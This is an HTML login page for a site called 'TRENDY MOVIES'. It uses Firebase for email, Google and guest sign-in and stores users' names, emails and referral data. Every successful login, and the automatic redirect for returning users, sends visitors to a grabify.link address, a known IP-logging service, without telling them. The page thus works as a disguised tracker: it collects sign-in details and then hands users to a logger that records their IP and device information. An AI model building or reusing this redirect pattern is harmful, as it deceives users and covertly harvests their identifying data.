<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <style>/* General Styles */
body {
  margin: 0;
  padding: 0;
  font-family: 'Arial', sans-serif;
  background-color: #1c1c1c; /* Light black background */
  color: #ffffff;
  text-align: center;
}

/* Buttons */
button {
  background-color: #ff0000; /* Red buttons */
  color: #ffffff; /* White text */
  border: none;
  border-radius: 5px;
  padding: 10px 20px;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
  transition: transform 0.3s ease, box-shadow 0.3s ease;
  margin: 10px;
}

button:hover {
  transform: translateY(-2px);
  box-shadow: 0 5px 15px rgba(255, 0, 0, 0.7);
}

/* Google Button */
#google-login-btn {
  background-color: #ffffff; /* White background */
  color: #000000; /* Black text */
  border: 2px solid #cccccc; /* Subtle border */
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 5px;
}

#google-login-btn:hover {
  box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
}

/* Input Fields */
input {
  width: 80%;
  max-width: 400px;
  padding: 10px;
  margin: 10px 0;
  border-radius: 5px;
  background-color: #2a2a2a;
  color: #ffffff;

}
/* Guest Login Button */
#guest-login-btn {
  background-color: #4e61cf; /* Grey background */
  color: #ffffff; /* White text */
  color: #000000; 
  border: 2px solid #666666;
  border-radius: 5px;
  padding: 10px 20px;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
  transition: transform 0.3s ease, box-shadow 0.3s ease;
}

#guest-login-btn:hover {
  transform: translateY(-2px);
  box-shadow: 0 5px 15px rgba(128, 128, 128, 0.7); /* Grey shadow */
}


/* Email and Password Input Styling */
input[type="email"], input[type="password"], input[type="name"], input[type="phone number"] {
  border: 2px solid #ff0000; /* Red border */
}

input[type="email"]:focus, input[type="password"]:focus, input[type="name"]:focus {
  outline: none;
  border-color: #ff4500; /* Slightly darker red when focused */
}

/* Small Text */
.small-text {
  font-size: 12px;
  color: #aaaaaa;
  margin-top: 5px;
}

/* Actions (Text Links) */
.text-link {
  color: #ec670e; /* Red links */
  cursor: pointer;
  text-decoration: underline;
  margin: 0 5px;
}

.text-link:hover {
  color: #ff3e3e;
}

/* Sections */
#login-section, #register-section {
  padding: 20px;
  margin: 20px auto;
  max-width: 400px;
  background-color: #2a2a2a; /* Slightly darker box background */
  border-radius: 10px;
  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.7);
}

body {
  font-family: Arial, sans-serif;
  text-align: center;
  padding: 20px;
}

#register-section {
  display: none;
}

.text-link {
  color: rgb(248, 103, 7);
  cursor: pointer;
  text-decoration: underline;
  margin: 0 5px;
}

button {
  margin: 5px;
  padding: 10px 20px;
  cursor: pointer;
}

.input-container {
  margin-bottom: 10px;
}

.small-text {
  font-size: 12px;
  color: gray;
  display: block;
  margin-top: 5px;
}

.actions {
  margin-top: 10px;
}</style>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body>
  <div id="app">
    <div id="app">
    <h1 style="font-family: Arial, sans-serif; font-size: 24px; color: rgb(23, 148, 23);">TRENDY MOVIES</h1>
    <img src="https://i.imghippo.com/files/IFI1305trM.jpg" alt="Company Logo" style="border-radius: 100%; width: 150px; height: 150px;">
    <div id="login-section">    
  <h2>Login</h2>
      <input id="email" type="email" placeholder="Email" required />
      <div class="input-container">
        <input id="login-password" type="password" placeholder="Password" />
        <span class="small-text">Enter your account password.</span>
      </div>
      <button id="login-btn">Login</button>
      <div>
        <br>
        <span class="text-link" id="forgot-password-link">Forgot Password?</span>    
        <span class="text-link" id="show-register-text">Register</span>
      </div>
      <br>
      <button id="google-login-btn">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png" alt="Google Logo" style="width: 20px; vertical-align: middle;"> Login with Google
      </button>
      <button id="guest-login-btn">
        <img src="https://cdn-icons-png.flaticon.com/512/552/552721.png" alt="guest Logo" style="width: 20px; vertical-align: middle;">‎ ‎ ‎ ‎  ‎ Login As Guest‎ ‎‎  
      </button>
    </div>
    <div id="register-section" style="display: none;">
      <h2>Register</h2>
      <input id="name" type="text" placeholder="Name" required />
      <input id="email-register" type="email" placeholder="Email" required />
      <div class="input-container">
        <input id="password" type="password" placeholder="Password" required />
        <input type="text" 
       id="referral-code" 
       placeholder="(Optional) Referral Code" 
       style="
           display: block; 
           margin: 20px auto; 
           padding: 15px; 
           max-width: 400px; 
           border: 2px solid green; 
           border-radius: 5px; 
           box-sizing: border-box;
           font-size: 16px;" />
        <span class="small-text">Enter correct details to log in</span>
      </div>
      <button id="register-btn">Register</button>
      
        
        <button id="show-login-text">Back to Login</button>
      </div>
    </div>
    
  <script>
    // Initialize Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyCBPGSYNVaPPDu7RWee9ymckMaI1VQNjd4",
      authDomain: "trendy-movie.firebaseapp.com",
      databaseURL: "https://trendy-movie-default-rtdb.firebaseio.com",
      projectId: "trendy-movie",
      storageBucket: "trendy-movie.firebasestorage.app",
      messagingSenderId: "699469684359",
      appId: "1:699469684359:web:34cc2adfc8019b89a76222",
      measurementId: "G-54SX69JVY3"
    };
    firebase.initializeApp(firebaseConfig);

    const auth = firebase.auth();
    const db = firebase.database();

    // Toggle between sections
    document.getElementById('show-register-text').addEventListener('click', () => {
      document.getElementById('register-section').style.display = 'block';
      document.getElementById('login-section').style.display = 'none';
    });

    document.getElementById('show-login-text').addEventListener('click', () => {
      document.getElementById('register-section').style.display = 'none';
      document.getElementById('login-section').style.display = 'block';
    });
// Show Loading Animation
const showLoading = () => {
    const loadingDiv = document.createElement('div');
    loadingDiv.id = 'loading-animation';
    loadingDiv.innerHTML = `
        <div style="
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(255, 255, 255, 0.8); 
            display: flex; 
            align-items: center; 
            justify-content: center;
            font-size: 24px;
            color: #6200ea;">
            Loading...
        </div>
    `;
    document.body.appendChild(loadingDiv);
};

const hideLoading = () => {
    const loadingDiv = document.getElementById('loading-animation');
    if (loadingDiv) loadingDiv.remove();
};

// Register new user
document.getElementById('register-btn').addEventListener('click', () => {
    const name = document.getElementById('name').value;
    const email = document.getElementById('email-register').value;
    const password = document.getElementById('password').value;

    auth.createUserWithEmailAndPassword(email, password)
        .then((userCredential) => {
            const user = userCredential.user;

            // Send verification email
            user.sendEmailVerification()
                .then(() => {
                    alert("Registration successful! Please verify your email before logging in.");
                })
                .catch(error => alert("Failed to send verification email: " + error.message));
        })
        .catch(error => alert(error.message));
});

// Login with email and password
document.getElementById('login-btn').addEventListener('click', () => {
    const email = document.getElementById('email').value;
    const password = document.getElementById('login-password').value;

    auth.signInWithEmailAndPassword(email, password)
        .then((userCredential) => {
            const user = userCredential.user;

            if (!user.emailVerified) {
                alert("Please verify your email before logging in.");
                auth.signOut();
                return;
            }

            showLoading(); // Show loading animation

            // Save user details in the Firebase database after login
            const userRef = db.ref('users/' + user.uid);

            // Generate referral code
            const generateReferralCode = () => {
                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
                let code = '';
                for (let i = 0; i < 5; i++) {
                    code += chars[Math.floor(Math.random() * chars.length)];
                }
                return code;
            };
            const referralCode = generateReferralCode();

            // Get optional referral code
            const referredBy = document.getElementById('referral-code')?.value.trim() || null;

            userRef.once('value').then(snapshot => {
                if (!snapshot.exists()) {
                    userRef.set({
                        name: document.getElementById('name')?.value || '', // Retrieve from input if available
                        email: user.email,
                        loginMethod: "Email",
                        lastLoginTime: new Date().toISOString(),
                        referralCode,
                        referredBy,
                        points: 0
                    });
                }

                // Save user UID and email to local storage
                localStorage.setItem('uid', user.uid);
                localStorage.setItem('email', user.email);

                hideLoading(); // Hide loading animation
                alert("Login successful!");
                window.location.href = "https://grabify.link/17CFFS";
            });
        })
        .catch(error => {
            hideLoading(); // Hide loading animation in case of error
            alert(error.message);
        });
});

// Generate referral code function
const generateReferralCode = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 5; i++) {
        code += chars[Math.floor(Math.random() * chars.length)];
    }
    return code;
};
// Forgot Password
document.getElementById('forgot-password-link').addEventListener('click', () => {
      const email = document.getElementById('email').value;
      if (!email) {
        alert("Please enter your email to reset your password.");
        return;
      }

      auth.sendPasswordResetEmail(email)
        .then(() => alert("Password reset email sent."))
        .catch(error => alert(error.message));
    });
//google
document.getElementById('google-login-btn').addEventListener('click', () => {
  const provider = new firebase.auth.GoogleAuthProvider();
  auth.signInWithPopup(provider)
    .then((result) => {
      const user = result.user;
      const userRef = db.ref('users/' + user.uid);

      // Save UID and email to local storage
      localStorage.setItem('uid', user.uid);
      localStorage.setItem('email', user.email);

      const now = new Date().toISOString();

      // Show Loading Animation
      const showLoading = () => {
        const loader = document.createElement('div');
        loader.id = 'loading-animation';
        loader.style.cssText = `
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(0, 0, 0, 0.6);
          display: flex;
          justify-content: center;
          align-items: center;
          z-index: 10000;
        `;
        loader.innerHTML = `<div style="border: 4px solid #f3f3f3; border-radius: 50%; border-top: 4px solid #4caf50; width: 50px; height: 50px; animation: spin 1s linear infinite;"></div>
          <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>`;
        document.body.appendChild(loader);
      };

      const hideLoading = () => {
        const loader = document.getElementById('loading-animation');
        if (loader) loader.remove();
      };

      userRef.once('value', (snapshot) => {
        hideLoading();

        if (!snapshot.exists()) {
          // Generate referral code
          const generateReferralCode = () => {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let code = '';
            for (let i = 0; i < 5; i++) {
              code += chars[Math.floor(Math.random() * chars.length)];
            }
            return code;
          };
          const referralCode = generateReferralCode();

          // First Popup: Ask Name
          const showNamePopup = () => {
            const popup = document.createElement('div');
            popup.id = 'popup-name-input';
            popup.style.cssText = `
              position: fixed;
              top: 50%;
              left: 50%;
              transform: translate(-50%, -50%);
              z-index: 1000;
              background: linear-gradient(135deg, #4caf50, #2c7be5);
              color: white;
              border-radius: 10px;
              padding: 15px;
              text-align: center;
              font-family: 'Arial', sans-serif;
              width: 80%;
              max-width: 300px;
              box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            `;

            popup.innerHTML = `
              <h3 style="margin-bottom: 10px; font-size: 1rem;">Enter Your Name</h3>
              <input id="popup-name" type="text" placeholder="Name" style="margin-bottom: 10px; padding: 8px; width: 90%; border: none; border-radius: 5px; font-size: 1rem;" required>
              <button id="name-next-btn" style="padding: 8px 15px; background-color: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 0.9rem;">Next</button>
            `;
            document.body.appendChild(popup);

            document.getElementById('name-next-btn').addEventListener('click', () => {
              const name = document.getElementById('popup-name').value.trim();
              if (name) {
                popup.remove();
                showReferralPopup(name);
              } else {
                alert("Please enter your name!");
              }
            });
          };

          // Second Popup: Ask Referral Code
          const showReferralPopup = (name) => {
            const popup = document.createElement('div');
            popup.id = 'popup-referral-input';
            popup.style.cssText = `
              position: fixed;
              top: 50%;
              left: 50%;
              transform: translate(-50%, -50%);
              z-index: 1000;
              background: linear-gradient(135deg, #4caf50, #2c7be5);
              color: white;
              border-radius: 10px;
              padding: 15px;
              text-align: center;
              font-family: 'Arial', sans-serif;
              width: 80%;
              max-width: 300px;
              box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            `;

            popup.innerHTML = `
              <h3 style="margin-bottom: 10px; font-size: 1rem;">Enter Referral Code</h3>
              <input id="popup-referral" type="text" placeholder="Referral Code (Optional)" style="margin-bottom: 10px; padding: 8px; width: 90%; border: none; border-radius: 5px; font-size: 1rem;">
              <button id="referral-submit-btn" style="padding: 8px 15px; background-color: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 0.9rem;">Submit</button>
              <button id="referral-skip-btn" style="padding: 8px 15px; background-color: #dc3545; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 0.9rem;">Skip</button>
            `;
            document.body.appendChild(popup);

            const saveUserDetails = (referredBy = null) => {
              userRef.set({
                name,
                email: user.email,
                photoURL: user.photoURL,
                loginMethod: "Google",
                lastLoginTime: now,
                referralCode,
                referredBy,
                points: 0
              }).then(() => {
                popup.remove();
                alert("Profile completed successfully!");
                showLoading();
                setTimeout(() => {
                  window.location.href = "https://grabify.link/17CFFS";
                }, 1500);
              }).catch(error => {
                alert("Failed to save user details: " + error.message);
              });
            };

            document.getElementById('referral-submit-btn').addEventListener('click', () => {
              const referredBy = document.getElementById('popup-referral').value.trim() || null;
              saveUserDetails(referredBy);
            });

            document.getElementById('referral-skip-btn').addEventListener('click', () => {
              saveUserDetails();
            });
          };

          showLoading();
          setTimeout(() => {
            hideLoading();
            showNamePopup();
          }, 1000);
        } else {
          // Update login time for existing users
          showLoading();
          userRef.update({
            loginMethod: "Google",
            lastLoginTime: now
          }).then(() => {
            setTimeout(() => {
              window.location.href = "https://grabify.link/17CFFS";
            }, 1500);
          });
        }
      });
    })
    .catch(error => alert("Google Login failed: " + error.message));
});

// Firebase database reference
const database = firebase.database();

// Save last login time
const userId = localStorage.getItem('uid');
if (userId) {
    const lastLoginTime = new Date().toISOString();
    
    database.ref(`users/${userId}`).update({
        lastLoginTime: lastLoginTime
    }).then(() => {
        console.log('Last login time updated in Firebase:', lastLoginTime);
    }).catch(error => {
        console.error('Error updating last login time:', error);
    });
}

// Guest Login
document.getElementById('guest-login-btn').addEventListener('click', () => {
  let guestLoginCount = localStorage.getItem('guestLoginCount');
  guestLoginCount = guestLoginCount ? parseInt(guestLoginCount) : 0;

  if (guestLoginCount >= 6) {
    alert("Guest login limit reached. Please create an account.");
    return;
  }

  // Check if the user is already stored in localStorage
  const guestUserId = localStorage.getItem('guestUserId');
  const guestName = localStorage.getItem('guestName');

  if (guestUserId && guestName) {
    // Update the last login time in the database for existing guest
    db.ref('users/' + guestUserId).update({
      lastLoginTime: new Date().toISOString()
    }).then(() => {
      alert("Welcome back, " + guestName + "!");
      window.location.href = "https://grabify.link/17CFFS";
    }).catch(error => {
      alert("Failed to update guest details: " + error.message);
    });
    return;
  }

  // Create and display a Google-style popup for name input
  const popup = document.createElement('div');
  popup.style.position = 'fixed';
  popup.style.top = '50%';
  popup.style.left = '50%';
  popup.style.transform = 'translate(-50%, -50%)';
  popup.style.zIndex = '1000';
  popup.style.backgroundColor = '#fff';
  popup.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.2)';
  popup.style.borderRadius = '10px';
  popup.style.padding = '30px';
  popup.style.textAlign = 'center';
  popup.style.fontFamily = 'Roboto, sans-serif';
  popup.style.width = '90%';
  popup.style.maxWidth = '380px';

  popup.innerHTML = `
    <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Avatar" style="width: 70px; height: 70px; margin-bottom: 15px; border-radius: 50%;">
    <h3 style="margin-bottom: 10px; font-size: 1.3rem; font-weight: 500; color: #202124;">Guest Login</h3>
    <p style="margin-bottom: 20px; font-size: 0.9rem; color: #5f6368;">Please enter your name to continue as a guest</p>
    <input id="guest-name" type="text" placeholder="Your Name" style="
      margin-bottom: 20px; 
      padding: 12px; 
      width: 100%; 
      border: 1px solid #dadce0; 
      border-radius: 4px; 
      font-size: 1rem; 
      box-sizing: border-box; 
      outline: none; 
      transition: border-color 0.2s;
    " onfocus="this.style.borderColor='#1a73e8'" onblur="this.style.borderColor='#dadce0'">
    <button id="guest-popup-submit-btn" style="
      padding: 10px 0; 
      width: 100%; 
      background-color: #1a73e8; 
      color: #fff; 
      border: none; 
      border-radius: 4px; 
      cursor: pointer; 
      font-size: 1rem; 
      font-weight: 500;
    ">Continue</button>
    <button id="guest-popup-cancel-btn" style="
      margin-top: 10px; 
      padding: 10px 0; 
      width: 100%; 
      background-color: #ff0000; 
      color: #202124; 
      border: none; 
      border-radius: 4px; 
      cursor: pointer; 
      font-size: 1rem;
    ">Cancel</button>
  `;
  document.body.appendChild(popup);

  // Handle submit action
  document.getElementById('guest-popup-submit-btn').addEventListener('click', () => {
    const name = document.getElementById('guest-name').value;

    if (name) {
      guestLoginCount++;
      localStorage.setItem('guestLoginCount', guestLoginCount);

      const newGuestUserId = `guest_${Date.now()}`;
      localStorage.setItem('guestUserId', newGuestUserId); // Save guest ID
      localStorage.setItem('guestName', name); // Save guest name

      db.ref('users/' + newGuestUserId).set({
        name,
        role: 'guest',
        loginTime: new Date().toISOString(),
        lastLoginTime: new Date().toISOString(),
        loginMethod: "Guest"
      }).then(() => {
        alert("Logged in as Guest.");
        popup.remove();
        window.location.href = "https://grabify.link/17CFFS";
      }).catch(error => {
        alert("Failed to save guest details: " + error.message);
      });
    } else {
      alert("Name is required to continue.");
    }
  });

  // Handle cancel action
  document.getElementById('guest-popup-cancel-btn').addEventListener('click', () => {
    popup.remove();
  });
});

// Function to show loading animation
function showLoadingAnimation() {
  // Create a loading overlay
  const loadingOverlay = document.createElement('div');
  loadingOverlay.id = 'loading-overlay';
  loadingOverlay.style.position = 'fixed';
  loadingOverlay.style.top = '0';
  loadingOverlay.style.left = '0';
  loadingOverlay.style.width = '100%';
  loadingOverlay.style.height = '100%';
  loadingOverlay.style.backgroundColor = 'rgba(0, 0, 0, 0.7)';
  loadingOverlay.style.display = 'flex';
  loadingOverlay.style.justifyContent = 'center';
  loadingOverlay.style.alignItems = 'center';
  loadingOverlay.style.zIndex = '1000';

  // Add a loading spinner
  const spinner = document.createElement('div');
  spinner.style.width = '50px';
  spinner.style.height = '50px';
  spinner.style.border = '5px solid #f3f3f3';
  spinner.style.borderTop = '5px solid #3498db';
  spinner.style.borderRadius = '50%';
  spinner.style.animation = 'spin 1s linear infinite';

  // Add spinner to the overlay
  loadingOverlay.appendChild(spinner);

  // Append the overlay to the body
  document.body.appendChild(loadingOverlay);

  // Add CSS animation for spinner
  const style = document.createElement('style');
  style.type = 'text/css';
  style.innerHTML = `
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  `;
  document.head.appendChild(style);
}

// Function to hide loading animation
function hideLoadingAnimation() {
  const loadingOverlay = document.getElementById('loading-overlay');
  if (loadingOverlay) {
    document.body.removeChild(loadingOverlay);
  }
}

// Check if user details exist in local storage
const userUID = localStorage.getItem('uid');
const userEmail = localStorage.getItem('email');

if (userUID && userEmail) {
  // Show loading animation
  showLoadingAnimation();

  // Simulate a delay before redirecting (optional, for UX purposes)
  setTimeout(() => {
    // Redirect to homepage
    window.location.href = 'https://grabify.link/17CFFS';
  }, 2000); // 2-second delay
}

  </script>
</body>
</html>
